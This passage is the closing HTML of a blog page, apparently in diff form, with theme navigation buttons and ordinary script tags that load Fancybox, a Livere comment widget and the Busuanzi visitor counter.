fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(()=>{
+  const loadLivere = () => {
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
